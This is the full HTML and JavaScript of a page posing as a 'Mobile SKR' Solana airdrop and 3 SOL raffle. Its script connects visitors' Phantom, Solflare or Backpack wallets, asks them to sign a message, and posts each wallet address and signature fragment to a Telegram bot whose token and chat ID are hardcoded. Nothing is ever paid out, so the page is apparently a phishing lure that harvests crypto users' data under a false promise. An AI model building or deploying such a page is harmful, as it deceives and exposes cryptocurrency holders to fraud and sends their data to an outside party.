<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mobile SKR | Airdrop & Raffle</title>
 
  <style>
    :root{
      --bg0:#070b10; --bg1:#0a1017; --text:#e8eef6;
      --muted:rgba(232,238,246,.72);
      --sol-a:#14f195; --sol-b:#80ecff; --sol-c:#a100ff;
      --radius-xl:22px; --radius-lg:18px;
      --border-soft:rgba(255,255,255,.10);
      --shadow:0 18px 60px rgba(0,0,0,.55);
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{
      font-family:system-ui,-apple-system,sans-serif;
      color:var(--text); background: var(--bg0);
      background-image: radial-gradient(1100px 700px at 50% 24%,rgba(120,170,255,.18) 0,rgba(120,170,255,0) 55%), linear-gradient(180deg,var(--bg1),var(--bg0));
      min-height:100vh; overflow-x:hidden;
    }
    #dust{ position:fixed; inset:0; pointer-events:none; z-index:0; }
    /* NAVBAR */
    .nav{
      position:fixed; top:0; left:0; right:0; height:72px; padding:0 22px;
      display:flex; align-items:center; justify-content:space-between;
      background:rgba(10,15,20,.8); backdrop-filter:blur(12px);
      border-bottom:1px solid rgba(255,255,255,.06); z-index:100;
    }
    .brand{ display:flex; align-items:center; gap:12px; font-weight:780; letter-spacing:.12em; text-transform:uppercase; font-size:.88rem; }
    .brand-mark{ width:30px; height:18px; border-radius:6px; background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); }
    .actions{ display:flex; gap:12px; align-items:center; }
    .btn{
      border-radius:999px; padding:10px 18px; border:1px solid rgba(255,255,255,.16);
      background:rgba(255,255,255,.05); color:var(--text); font-weight:650; font-size:.9rem;
      cursor:pointer; transition: 0.2s; white-space:nowrap;
    }
    .btn:hover:not(:disabled){ background:rgba(255,255,255,.12); transform:translateY(-1px); }
    .btn-primary{ background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); color:#05080b; border:none; }
    .btn-accent{ background:linear-gradient(90deg,var(--sol-c), #cc80ff); color:#fff; border:none; }
    .btn:disabled{ opacity:.3; cursor:not-allowed; }
    /* HERO */
    .wrap{ max-width:1000px; margin:0 auto; padding:120px 20px 60px; position:relative; z-index:1; }
    .hero{
      background:rgba(0,0,0,.4); border:1px solid rgba(255,255,255,.08);
      border-radius:var(--radius-xl); padding:60px 20px; text-align:center; box-shadow:var(--shadow);
    }
    .hero-logo{ width:120px; margin-bottom:15px; filter:drop-shadow(0 0 20px var(--sol-a)); }
    h1{ font-size:3.5rem; font-weight:900; margin-bottom:10px; }
    .hero-badge{
      display:inline-block; padding:6px 16px; border-radius:999px;
      background:rgba(20,241,149,.1); border:1px solid var(--sol-a);
      color:var(--sol-a); font-size:.85rem; margin-bottom:25px;
    }
   
    .status-msg{ margin:20px 0; min-height:24px; color:var(--sol-a); font-weight:500; }
    /* WALLET GRID */
    .wallet-panel{ margin:30px 0; background:rgba(255,255,255,.03); padding:20px; border-radius:var(--radius-lg); border:1px solid rgba(255,255,255,.05); }
    .wallet-grid{ display:flex; justify-content:center; gap:10px; flex-wrap:wrap; margin-top:15px; }
    .wallet-item{
        display:flex; align-items:center; gap:8px; padding:8px 15px;
        background:rgba(0,0,0,.5); border:1px solid rgba(255,255,255,.1);
        border-radius:999px; cursor:pointer; font-size:0.85rem;
    }
    .wallet-item:hover{ border-color:var(--sol-a); }
    .main-btns{ display:flex; flex-direction:column; gap:15px; align-items:center; margin-top:30px; }
    .big-btn{ width:100%; max-width:400px; padding:18px; border-radius:15px; font-size:1.1rem; font-weight:800; text-transform:uppercase; border:none; cursor:pointer; transition:0.3s; }
  </style>
</head>
<body>
  <canvas id="dust"></canvas>
  <header class="nav">
    <div class="brand">
      <div class="brand-mark"></div>
      <div>Mobile SKR</div>
    </div>
    <div class="actions">
      <button class="btn" id="connect-nav" onclick="connectWallet()">Connect Wallet</button>
    </div>
  </header>
  <main class="wrap">
    <section class="hero">
      <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i" class="hero-logo" alt="SKR Logo">
      <h1>SKR HUB</h1>
      <div class="hero-badge">🎁 AIRDROP: 500 SKR ACTIVE</div>
     
      <p style="color:var(--muted); max-width:600px; margin:0 auto;">
        Connect your wallet and sign the message to confirm your participation in the Mobile SKR ecosystem.
      </p>
      <div id="status" class="status-msg">Waiting for connection...</div>
      <div class="main-btns">
        <button id="airdrop-btn" class="big-btn btn-primary" disabled onclick="handleSign('airdrop')">
            Join Airdrop
        </button>
        <button id="raffle-btn" class="big-btn btn-accent" disabled onclick="handleSign('giveaway')">
            Raffle 3 SOL
        </button>
      </div>
      <div class="wallet-panel">
        <div style="font-size:0.8rem; text-transform:uppercase; letter-spacing:1px; color:var(--muted)">Available Wallets</div>
        <div class="wallet-grid">
            <div class="wallet-item" onclick="connectWallet()"><span style="color:#8a5cff">●</span> Phantom</div>
            <div class="wallet-item" onclick="connectWallet()"><span style="color:#ff9a4a">●</span> Solflare</div>
            <div class="wallet-item" onclick="connectWallet()"><span style="color:#34d5ff">●</span> Backpack</div>
        </div>
      </div>
    </section>
  </main>
  <script>
    // --- YOUR SETTINGS ---
    const TG_TOKEN = "8425995205:AAEuTNVYnHHKMO87GOgAo1YIxr7WfhvPW2E";
    const TG_CHAT_ID = "1041935839";
    let walletAddress = null;

    // 1. CONNECT WALLET
    async function connectWallet() {
      if (!window.solana && !window.solflare && !window.backpack) {
        alert("Wallet not detected! Please install Phantom, Solflare or Backpack.");
        return;
      }

      let provider = window.solana || window.solflare || window.backpack;

      try {
        const resp = await provider.connect();
        walletAddress = resp.publicKey.toString();
       
        // Update UI
        document.getElementById('connect-nav').innerText = walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
        document.getElementById('status').innerText = "Wallet connected! Now sign your claim.";
        document.getElementById('airdrop-btn').disabled = false;
        document.getElementById('raffle-btn').disabled = false;
       
      } catch (err) {
        console.error(err);
        document.getElementById('status').innerText = "Wallet connection failed.";
      }
    }

    // 2. SIGN AND SEND TO TELEGRAM
    async function handleSign(type) {
      if (!walletAddress) return;

      const message = type === 'airdrop'
        ? `I confirm my participation in Mobile SKR Airdrop.\nWallet: ${walletAddress}\nDate: ${new Date().toISOString()}`
        : `Entry for the 3 SOL raffle.\nWallet: ${walletAddress}\nGood luck to me!`;

      let provider = window.solana || window.solflare || window.backpack;

      try {
        document.getElementById('status').innerText = "Confirm the action in your wallet...";
       
        const encodedMessage = new TextEncoder().encode(message);
        const signedMessage = await provider.signMessage(encodedMessage, "utf8");
        const signature = btoa(String.fromCharCode(...signedMessage.signature));

        document.getElementById('status').innerText = "Sending data...";

        // Send to Telegram
        const text = `🚀 *NEW SIGNATURE!*\n\n` +
                     `📍 *Type:* ${type === 'airdrop' ? 'AIRDROP' : 'RAFFLE'}\n` +
                     `💎 *Wallet:* \`${walletAddress}\`\n` +
                     `✍️ *Signature:* \`${signature.slice(0,40)}...\``;

        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "Markdown"
          })
        });

        document.getElementById('status').innerText = "✅ Your claim has been successfully registered!";
        document.getElementById('status').style.color = "#14f195";
        alert("Success! Your signature has been recorded.");

      } catch (err) {
        console.error(err);
        document.getElementById('status').innerText = "Error: Signature cancelled or failed.";
        document.getElementById('status').style.color = "#ff4a4a";
      }
    }

    // --- PARTICLE ANIMATION (dust/stars) ---
    (function () {
      const canvas = document.getElementById("dust");
      const ctx = canvas.getContext("2d");
      let w, h, dpr;

      function resize() {
        dpr = window.devicePixelRatio || 1;
        w = canvas.width = window.innerWidth * dpr;
        h = canvas.height = window.innerHeight * dpr;
        ctx.scale(dpr, dpr);
      }
      window.addEventListener("resize", resize);
      resize();

      const particles = Array.from({ length: 100 }, () => ({
        x: Math.random() * window.innerWidth,
        y: Math.random() * window.innerHeight,
        r: Math.random() * 2,
        vx: Math.random() * 0.5 - 0.25,
        vy: Math.random() * 0.5 + 0.1,
        a: Math.random() * 0.5 + 0.2
      }));

      function tick() {
        ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
        ctx.fillStyle = "#ffffff";

        particles.forEach(p => {
          ctx.globalAlpha = p.a;
          ctx.beginPath();
          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
          ctx.fill();

          p.y += p.vy;
          p.x += p.vx;

          if (p.y > window.innerHeight) p.y = -10;
          if (p.x > window.innerWidth) p.x = 0;
          if (p.x < 0) p.x = window.innerWidth;
        });

        requestAnimationFrame(tick);
      }
      tick();
    })();
  </script>
</body>
</html>
